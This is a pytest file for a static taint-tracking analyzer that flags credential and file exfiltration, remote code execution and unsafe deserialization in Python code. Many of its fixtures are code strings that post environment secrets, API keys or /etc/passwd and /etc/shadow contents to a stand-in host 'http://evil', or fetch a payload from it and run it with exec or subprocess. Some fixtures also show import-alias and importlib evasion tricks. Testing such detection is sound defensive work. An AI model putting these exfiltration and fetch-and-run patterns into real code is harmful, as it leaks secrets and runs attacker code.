# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for behavioral_taint_tracking analyzer (TT1–TT5): source→sink data-flow."""

from __future__ import annotations

import json
import time

from skillspector.nodes.analyzers import behavioral_taint_tracking
from skillspector.nodes.analyzers.common import build_type_map
from skillspector.nodes.deduplicate import deduplicate
from skillspector.python_ast import get_python_ast
from skillspector.state import WorkflowResourceBudget


def _run(code: str, filename: str = "script.py") -> list:
    state = {
        "components": [filename],
        "file_cache": {filename: code},
    }
    result = behavioral_taint_tracking.node(state)
    return result["findings"]


def _rule_ids(findings: list) -> set[str]:
    return {f.rule_id for f in findings}


# ── TT3: Credential source → network sink ──────────────────────────────


class TestCredentialExfiltration:
    def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
        call = 'requests.post("http://evil", data=secret)'
        code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'

        tt3 = [finding for finding in _run(code) if finding.rule_id == "TT3"]

        assert len(tt3) == 2
        assert len({finding.fingerprint() for finding in tt3}) == 1
        assert len({finding.start_column for finding in tt3}) == 2
        compacted = deduplicate(tt3)
        assert len(compacted) == 1
        assert len(compacted[0].occurrences) == 2

    def test_long_taint_sink_uses_complete_source_identity(self):
        def code(tail: str) -> str:
            shared_headers = "\n".join(
                f'        "header-{index}": "{"a" * 80}",' for index in range(5)
            )
            return (
                "import os, requests\n"
                'secret = os.environ.get("KEY")\n'
                "requests.post(\n"
                '    "https://example.invalid",\n'
                "    data=secret,\n"
                "    headers={\n"
                f"{shared_headers}\n"
                f'        "tail": "{tail}",\n'
                "    },\n"
                ")\n"
            )

        first_code = code("UNIQUE_FIRST_TAIL")
        second_code = code("UNIQUE_SECOND_TAIL")
        first = next(f for f in _run(first_code, "first.py") if f.rule_id == "TT3")
        second = next(f for f in _run(second_code, "second.py") if f.rule_id == "TT3")

        assert first.matched_text == second.matched_text
        assert len(first.matched_text or "") == 200
        assert first.fingerprint() != second.fingerprint()
        assert len(deduplicate([first, second])) == 2
        assert "UNIQUE_FIRST_TAIL" not in json.dumps(first.to_dict(), sort_keys=True)

    def test_direct_environ_to_requests_post(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert tt3[0].severity == "CRITICAL"

    def test_variable_mediated_environ_to_post(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("API_KEY")\n'
            'requests.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert "secret" in tt3[0].message or "API_KEY" in tt3[0].message

    def test_environ_subscript_to_network(self):
        code = (
            "import os, requests\n"
            'token = os.environ["SECRET_TOKEN"]\n'
            'requests.post("http://evil", headers={"Auth": token})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_getenv_to_httpx(self):
        code = (
            "import os, httpx\n"
            'key = os.getenv("KEY")\n'
            'httpx.post("http://evil", json={"key": key})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1


# ── TT4: File read → network sink ──────────────────────────────────────


class TestFileExfiltration:
    def test_open_read_to_requests(self):
        code = (
            "import requests\n"
            'data = open("/etc/passwd").read()\n'
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) >= 1
        assert tt4[0].severity == "HIGH"

    def test_open_write_not_a_source(self):
        """open() in write mode should not be treated as a source."""
        code = 'import requests\nf = open("out.txt", "w")\nrequests.post("http://evil", data=f)\n'
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) == 0


# ── TT5: External input → exec sink ────────────────────────────────────


class TestExternalInputToExec:
    def test_input_to_eval(self):
        code = "cmd = input()\neval(cmd)\n"
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1
        assert tt5[0].severity == "CRITICAL"

    def test_requests_get_to_exec(self):
        code = 'import requests\ncode = requests.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_direct_input_to_os_system(self):
        code = 'import os\nos.system(input("cmd: "))'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_network_to_subprocess(self):
        code = (
            "import requests, subprocess\n"
            'payload = requests.get("http://evil").text\n'
            "subprocess.run(payload, shell=True)\n"
        )
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1


# ── TT6: External / file input → deserialization sink ──────────────────


class TestUntrustedDeserialization:
    def test_network_to_pickle_loads(self):
        code = (
            "import requests, pickle\n"
            'blob = requests.get("http://evil/payload").content\n'
            "obj = pickle.loads(blob)\n"
        )
        findings = _run(code)
        tt6 = [f for f in findings if f.rule_id == "TT6"]
        assert len(tt6) >= 1
        assert tt6[0].severity == "HIGH"
        assert "deserialization" in tt6[0].message

    def test_file_read_to_pickle_load(self):
        code = 'import pickle\nobj = pickle.load(open("bundled.pkl", "rb"))\n'
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_user_input_to_pickle_loads(self):
        code = "import pickle\npickle.loads(input())\n"
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_network_to_yaml_unsafe_load(self):
        code = (
            "import requests, yaml\n"
            'data = requests.get("http://evil").text\n'
            "yaml.unsafe_load(data)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_constant_argument_no_tt6(self):
        code = 'import pickle\npickle.loads(b"\\x80\\x04constant")\n'
        findings = _run(code)
        assert not any(f.rule_id == "TT6" for f in findings)


# ── TT1: Direct source-to-sink (generic) ───────────────────────────────


class TestDirectFlow:
    def test_open_read_to_exec(self):
        code = 'exec(open("payload.py").read())'
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT1" in rule_ids or "TT5" in rule_ids

    def test_environ_to_eval(self):
        code = 'import os\neval(os.environ.get("CODE"))'
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT5") for f in findings)


# ── TT2: Variable-mediated (generic) ───────────────────────────────────


class TestTaintPropagation:
    def test_reassignment_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "data = secret\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_dict_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'payload = {"key": secret}\n'
            'requests.post("http://evil", json=payload)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_list_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "items = [secret]\n"
            'requests.post("http://evil", json=items)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_fstring_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'msg = f"token={secret}"\n'
            'requests.post("http://evil", data=msg)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_multi_hop_propagation(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "a = secret\n"
            "b = a\n"
            'requests.post("http://evil", data=b)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_untainted_reassignment_no_finding(self):
        code = 'import requests\nx = 42\ny = x\nrequests.post("http://example.com", data=y)\n'
        findings = _run(code)
        assert not any(f.rule_id == "TT3" for f in findings)


class TestVariableMediatedFlow:
    def test_method_call_on_file_object_not_tracked(self):
        """f.write() is a method call on a variable — not a recognized sink."""
        code = 'data = open("secret.txt").read()\nf = open("exfil.txt", "w")\nf.write(data)\n'
        findings = _run(code)
        assert isinstance(findings, list)

    def test_doubly_nested_source_before_shallower_sink_is_tracked(self):
        """A source assigned two AST levels deeper than its sink must still flow.

        The analyzer walks the module once, recording each source assignment
        into a `tainted` dict and consulting it at sink call sites. Walking in
        AST breadth-first order (as `ast.walk` does) visits a sink nested one
        level shallower than its source BEFORE the source assignment, even
        though the assignment appears earlier in the source text — the taint
        lookup then finds nothing and a real credential-exfiltration flow is
        silently dropped. This is the natural shape of an env var read inside
        a guarded/nested block and exfiltrated at module level afterwards.
        """
        code = (
            "import os, requests\n"
            "if True:\n"
            "    if True:\n"
            '        secret = os.environ.get("API_KEY")\n'
            'requests.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_function_defined_before_module_level_source_is_tracked(self):
        """A sink inside a function DEFINED before its source must still flow.

        The function body only runs when called, after the later assignment
        has already executed — order in the file is not execution order.
        """
        code = (
            "import os, requests\n"
            "def send():\n"
            "    requests.post('http://evil', data=API_KEY)\n"
            'API_KEY = os.environ["API_KEY"]\n'
            "send()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_helper_called_from_main_after_source_read_is_tracked(self):
        """A sink in a helper called from main(), after main() reads the source."""
        code = (
            "import os, requests\n"
            "def upload(payload):\n"
            "    requests.post('http://evil', data=payload)\n"
            "def main():\n"
            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
            "    upload(payload)\n"
            "main()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_helper_called_under_main_guard_is_tracked(self):
        """Same shape as above, guarded by `if __name__ == "__main__":`."""
        code = (
            "import os, requests\n"
            "def upload(payload):\n"
            "    requests.post('http://evil', data=payload)\n"
            'if __name__ == "__main__":\n'
            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
            "    upload(payload)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_method_using_module_global_assigned_later_is_tracked(self):
        """A method reads a module global that is assigned after the class body."""
        code = (
            "import os, requests\n"
            "class Uploader:\n"
            "    def send(self):\n"
            "        requests.post('http://evil', data=API_KEY)\n"
            'API_KEY = os.environ["API_KEY"]\n'
            "Uploader().send()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_loop_carried_source_read_after_sink_in_body_is_tracked(self):
        """A sink in a loop body, above the source read it consumes next iteration."""
        code = (
            "import os, requests\n"
            "secret = None\n"
            "for _ in range(2):\n"
            "    requests.post('http://evil', data=secret)\n"
            '    secret = os.environ["API_KEY"]\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)


# ── Edge cases ──────────────────────────────────────────────────────────


class TestEdgeCases:
    def test_non_python_skipped(self):
        state = {
            "components": ["readme.md"],
            "file_cache": {"readme.md": 'exec(os.environ.get("X"))'},
        }
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_syntax_error_skipped(self):
        findings = _run("def broken(\n")
        assert findings == []

    def test_empty_file(self):
        findings = _run("")
        assert findings == []

    def test_safe_code_no_findings(self):
        code = "import json\ndata = json.loads('{}')\nprint(data)\n"
        findings = _run(code)
        assert findings == []

    def test_empty_components(self):
        state = {"components": [], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_missing_file_in_cache(self):
        state = {"components": ["missing.py"], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_oversized_file_skipped(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        big = 'import os\nexec(os.environ.get("KEY"))\n' + ("x = 1\n" * MAX_FILE_CHARS)
        state = {"components": ["big.py"], "file_cache": {"big.py": big}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_exact_character_limit_scanned(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        prefix = 'import os\nexec(os.environ.get("KEY"))\n'
        code = prefix + (" " * (MAX_FILE_CHARS - len(prefix)))
        assert len(code) == MAX_FILE_CHARS
        assert _rule_ids(_run(code))

    def test_multibyte_under_char_limit_scanned(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        prefix = 'import os\nexec(os.environ.get("KEY"))\n# '
        code = prefix + ("🦄" * 250_000)
        assert len(code) <= MAX_FILE_CHARS
        assert len(code.encode("utf-8")) > MAX_FILE_CHARS
        assert _rule_ids(_run(code))

    def test_oversized_file_does_not_stop_later_components(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        big = 'import os\nexec(os.environ.get("KEY"))\n' + ("x = 1\n" * MAX_FILE_CHARS)
        small = 'import os\nexec(os.environ.get("KEY"))\n'
        state = {
            "components": ["big.py", "small.py"],
            "file_cache": {"big.py": big, "small.py": small},
        }

        result = behavioral_taint_tracking.node(state)
        files = {f.file for f in result["findings"]}
        assert "big.py" not in files
        assert "small.py" in files

    def test_multiple_files_produce_findings(self):
        state = {
            "components": ["a.py", "b.py"],
            "file_cache": {
                "a.py": 'import os, requests\nrequests.post("http://evil", data=os.environ.get("K"))',
                "b.py": "cmd = input()\neval(cmd)\n",
            },
        }
        result = behavioral_taint_tracking.node(state)
        files = {f.file for f in result["findings"]}
        assert "a.py" in files
        assert "b.py" in files

    def test_finding_has_context(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].context is not None

    def test_finding_has_matched_text(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].matched_text is not None

    def test_finding_has_remediation(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].remediation is not None
        assert len(findings[0].remediation) > 0


# ── Multiple findings ───────────────────────────────────────────────────


class TestMultipleFindings:
    def test_multiple_flows_in_one_file(self):
        code = (
            "import os, requests, subprocess\n"
            'secret = os.environ.get("KEY")\n'
            'requests.post("http://evil", data=secret)\n'
            "cmd = input()\n"
            "subprocess.run(cmd, shell=True)\n"
        )
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT3" in rule_ids
        assert "TT5" in rule_ids

    def test_dedup_same_line(self):
        """Same rule+line should not produce duplicate findings."""
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        lines = [f.start_line for f in tt3]
        assert len(lines) == len(set(lines))


# ── Import-alias evasion ──────────────────────────────────────────────


class TestImportAliasEvasion:
    """Source/sink resolution must survive ``from ... import`` and ``import ... as``.

    Fully-qualified set membership (e.g. ``"subprocess.run"``) otherwise misses any
    locally aliased spelling, letting a skill hide an exfiltration/exec flow.
    """

    def test_from_subprocess_import_run_as_exec_sink(self):
        code = "from subprocess import run\ncmd = input()\nrun(cmd, shell=True)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_credential_to_aliased_network(self):
        code = (
            "import os as o\n"
            "import requests as r\n"
            'secret = o.getenv("KEY")\n'
            'r.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_environ_subscript_to_network(self):
        code = (
            "import os as o\n"
            "import requests\n"
            'token = o.environ["SECRET"]\n'
            'requests.post("http://evil", data=token)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_network_input_to_exec(self):
        code = 'import requests as r\ncode = r.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_safe_flow_no_false_positive(self):
        code = (
            "import json as j\n"
            "import requests as r\n"
            'cfg = j.loads("{}")\n'
            'r.post("http://example.com", json=cfg)\n'
        )
        findings = _run(code)
        assert findings == []


# ── Type-aware instance-method resolution ─────────────────────────────


class TestTypeAwareResolution:
    def test_pathlib_read_text_as_source(self):
        """pathlib.Path(...).read_text() should be detected as a file-read source."""
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_pathlib_read_bytes_as_source(self):
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/shadow")\n'
            "data = p.read_bytes()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_socket_recv_as_source(self):
        """socket.socket().recv() should be detected as a network-input source."""
        code = "import socket\nsock = socket.socket()\ndata = sock.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_socket_send_as_sink(self):
        """socket.socket().send() should be detected as a network-output sink."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "sock = socket.socket()\n"
            "sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_pathlib_write_text_as_sink(self):
        code = (
            "import os, pathlib\n"
            'secret = os.environ.get("KEY")\n'
            'p = pathlib.Path("out.txt")\n'
            "p.write_text(secret)\n"
        )
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT2") for f in findings)

    def test_from_import_pathlib(self):
        """``from pathlib import Path`` should resolve p.read_text() correctly."""
        code = (
            "from pathlib import Path\n"
            "import requests\n"
            'p = Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_from_import_socket(self):
        """``from socket import socket`` should resolve s.recv() correctly."""
        code = "from socket import socket\ns = socket()\ndata = s.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_with_statement_socket(self):
        """``with socket.socket() as sock:`` should infer type for sock."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "with socket.socket() as sock:\n"
            "    sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_untyped_variable_no_false_positive(self):
        """Method calls on untyped variables should not produce false matches."""
        code = (
            "import requests\n"
            "x = some_function()\n"
            "data = x.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert not any(f.rule_id == "TT4" for f in findings)


# ── builtins / importlib exec-sink evasion ────────────────────────────


class TestBuiltinsImportlibSinkEvasion:
    """Exec sinks reached via ``builtins.*`` or ``importlib.import_module`` must alert.

    ``_EXEC_SINKS`` matches by bare/qualified name (``"exec"``, ``"os.system"``).
    ``from builtins import exec`` resolves to ``builtins.exec`` (collapsed back to
    ``exec``) and ``importlib.import_module('subprocess').run`` resolves to the
    canonical ``subprocess.run`` — both must re-enter the exec-sink path so a
    user-input → exec flow is flagged as TT5. Complements the ``getattr`` branch
    (PR #166): this covers the import/builtins/importlib branch.
    """

    def test_from_builtins_import_exec_sink(self):
        """``from builtins import exec`` with tainted input must raise TT5."""
        code = "from builtins import exec\ncode = input()\nexec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_import_builtins_dot_exec_sink(self):
        """``import builtins; builtins.exec(input())`` must raise TT5."""
        code = "import builtins\ncode = input()\nbuiltins.exec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_import_builtins_as_alias_sink(self):
        """``import builtins as b2; b2.exec(input())`` must raise TT5."""
        code = "import builtins as b2\ncode = input()\nb2.exec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_import_module_os_system_sink(self):
        """``importlib.import_module('os').system(input())`` must raise TT5."""
        code = "import importlib\ncmd = input()\nimportlib.import_module('os').system(cmd)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_import_module_subprocess_run_sink(self):
        """``importlib.import_module('subprocess').run(input())`` must raise TT5."""
        code = "import importlib\ncmd = input()\nimportlib.import_module('subprocess').run(cmd)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_from_importlib_import_module_sink(self):
        """Bare-imported ``import_module('os').system(input())`` must raise TT5."""
        code = (
            "from importlib import import_module\ncmd = input()\nimport_module('os').system(cmd)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_benign_module_no_false_positive(self):
        """A benign dynamic import (``json.loads``) must not be treated as an exec sink."""
        code = "import importlib\ndata = input()\nimportlib.import_module('json').loads(data)\n"
        findings = _run(code)
        assert not any(f.rule_id == "TT5" for f in findings)


class TestInspectionLedgerResponse:
    def test_syntax_error_is_a_nonfatal_skipped_work_item(self) -> None:
        result = behavioral_taint_tracking.node(
            {
                "components": ["broken.py", "README.md"],
                "file_cache": {"broken.py": "def broken(:\n", "README.md": "# docs\n"},
            }
        )

        assert [event["path"] for event in result["inspection_ledger"]] == ["broken.py"]
        assert result["inspection_ledger"][0]["reason_code"] == "syntax_error"
        assert result["analyzer_status_events"][0]["status"] == "degraded"


class TestResourceBounds:
    @staticmethod
    def _flows(prefix: str, count: int) -> str:
        return "\n".join(
            f"{prefix}{index} = input()\nexec({prefix}{index})" for index in range(count)
        )

    def test_finding_caps_stop_construction_and_account_remaining_work(self, monkeypatch) -> None:
        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ARTIFACT", 2)
        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ANALYZER", 3)
        result = behavioral_taint_tracking.node(
            {
                "components": ["a.py", "b.py", "c.py"],
                "file_cache": {
                    "a.py": self._flows("a", 4),
                    "b.py": self._flows("b", 2),
                    "c.py": self._flows("c", 1),
                },
            }
        )

        assert len(result["findings"]) == 3
        assert [event["outcome"] for event in result["inspection_ledger"]] == [
            "partial",
            "partial",
            "partial",
        ]
        assert result["inspection_ledger"][0]["limit_findings"] == 2
        assert result["inspection_ledger"][1]["limit_findings"] == 3
        assert result["inspection_ledger"][2]["emitted_finding_ids"] == []
        assert result["analyzer_status_events"][0]["status"] == "degraded"

    def test_expired_workflow_deadline_marks_every_python_target_partial(self) -> None:
        result = behavioral_taint_tracking.node(
            {
                "components": ["a.py", "b.py"],
                "file_cache": {
                    "a.py": self._flows("a", 1),
                    "b.py": self._flows("b", 1),
                },
                "workflow_resource_budget": WorkflowResourceBudget(max_seconds=0.0),
            }
        )

        assert result["findings"] == []
        assert [event["reason_code"] for event in result["inspection_ledger"]] == [
            "runtime_limit",
            "runtime_limit",
        ]


class _RuntimeBudgetError(RuntimeError):
    """Raised by the test's check_runtime once a call-count cap is reached."""


def _capped_check_runtime(max_calls: int):
    """A check_runtime callback that raises after *max_calls* invocations.

    A non-terminating or super-linear fixpoint trips the cap and fails the
    test fast, instead of spinning to the scan-wide deadline and hanging CI.
    """
    state = {"calls": 0}

    def check_runtime() -> None:
        state["calls"] += 1
        if state["calls"] > max_calls:
            raise _RuntimeBudgetError(f"check_runtime exceeded {max_calls} calls")

    return check_runtime


def _collect(code: str, check_runtime=None) -> dict:
    """Run `_collect_tainted` directly on *code* and return name -> source_call."""
    parsed = get_python_ast(None, code, "t.py")
    type_map = build_type_map(parsed.tree, parsed.import_aliases)
    tainted = behavioral_taint_tracking._collect_tainted(
        parsed.tree, type_map, parsed.import_aliases, check_runtime
    )
    return {name: tv.source_call for name, tv in tainted.items()}


class TestFixpointTermination:
    """The taint fixpoint must be monotone and linear, not order-dependent.

    These guard the two blockers in PR #611's second review: the previous
    "repeat every pass until values stop changing" loop could oscillate
    forever on cyclic re-assignments and was quadratic on reverse-ordered
    chains, letting a tiny crafted file spin the analyzer to the scan-wide
    deadline and disable taint analysis for every later Python file.
    """

    def test_cyclic_reassignment_terminates_and_taints_all(self) -> None:
        """The reviewer's oscillating module must converge, not spin forever.

        `x = os.getenv("A"); x = y; y = os.environ["B"]; y = z; z = x` made the
        old whole-value fixpoint swap the sources of x/y/z on every pass and
        never exit. Add-only taint can only grow, so it must terminate well
        inside the call cap and still taint all three names.
        """
        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
        sources = _collect(code, _capped_check_runtime(2000))
        assert set(sources) == {"x", "y", "z"}
        # Every name traces back to one of the two credential sources.
        assert set(sources.values()) <= {"os.getenv", "os.environ"}

    def test_cyclic_reassignment_flows_to_sink(self) -> None:
        """End to end: the oscillating module plus a sink still reports TT3."""
        code = (
            "import os, requests\n"
            'x = os.getenv("A")\n'
            "x = y\n"
            'y = os.environ["B"]\n'
            "y = z\n"
            "z = x\n"
            'requests.post("http://evil", data=z)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_reverse_ordered_chain_is_linear(self) -> None:
        """A reverse chain no longer needs N+1 passes over N assignments.

        `a3 = a2; a2 = a1; a1 = a0; a0 = os.getenv("K")` forced the old loop
        into one full pass per link. A monotone worklist taints each name once,
        so a few thousand links finish well inside a linear call cap (and far
        under a second) rather than quadratically.
        """
        depth = 3200
        lines = ["import os"]
        lines += [f"a{i} = a{i - 1}" for i in range(depth, 0, -1)]
        lines.append('a0 = os.getenv("K")')
        code = "\n".join(lines) + "\n"

        start = time.monotonic()
        # Linear bound: a small constant per assignment. A quadratic loop would
        # need ~depth passes and blow past this cap immediately.
        sources = _collect(code, _capped_check_runtime(depth * 20))
        elapsed = time.monotonic() - start

        assert len(sources) == depth + 1
        assert all(src == "os.getenv" for src in sources.values())
        assert elapsed < 1.0

    def test_cyclic_reassignment_does_not_hang_without_cap(self) -> None:
        """Even with no runtime check at all (budget=None callers), it returns."""
        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
        sources = _collect(code)  # check_runtime=None
        assert set(sources) == {"x", "y", "z"}

    def test_wide_unpacking_fires_each_assignment_once(self, monkeypatch) -> None:
        """A wide propagating assignment must fire once, not once per read name.

        The reviewer's remaining blocker: `propagators` stored each propagating
        assignment once per distinct name its value reads, so for

            s0, s1, ..., sK = os.getenv("X")     # K names, seeded directly
            t0, t1, ..., tK' = s0, s1, ..., sK    # one Assign, K' targets

        draining each of the K tainted read names re-ran ``_mark_targets`` over
        the whole K'-target list, giving K x K' work. A ``check_runtime`` call
        cap cannot see this (the drain makes only K + 1 checks). So count
        ``_mark_targets`` calls directly and assert each assignment fires at
        most once: the total is bounded by the number of assignments, not by
        names read x targets.
        """
        width = 2000
        reads = ", ".join(f"s{i}" for i in range(width))
        targets = ", ".join(f"t{i}" for i in range(width))
        code = (
            "import os\n"
            f'{reads} = os.getenv("X")\n'  # direct source: taints s0..s{width-1}
            f"{targets} = {reads}\n"  # one propagating Assign with `width` targets
        )

        # There are exactly two Assign statements; linear drain must not call
        # _mark_targets more than once per assignment.
        n_assignments = 2
        calls = {"n": 0}
        orig_mark_targets = behavioral_taint_tracking._mark_targets

        def counting_mark_targets(*args, **kwargs):
            calls["n"] += 1
            return orig_mark_targets(*args, **kwargs)

        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)

        start = time.monotonic()
        sources = _collect(code, _capped_check_runtime(width * 20))
        elapsed = time.monotonic() - start

        # Fire-once: one call seeds the direct source, one fires the propagator.
        # The quadratic shape would call _mark_targets `width` times in the drain.
        assert calls["n"] <= n_assignments
        # All read and target names are tainted, all tracing to os.getenv.
        assert len(sources) == 2 * width
        assert all(src == "os.getenv" for src in sources.values())
        assert elapsed < 1.0
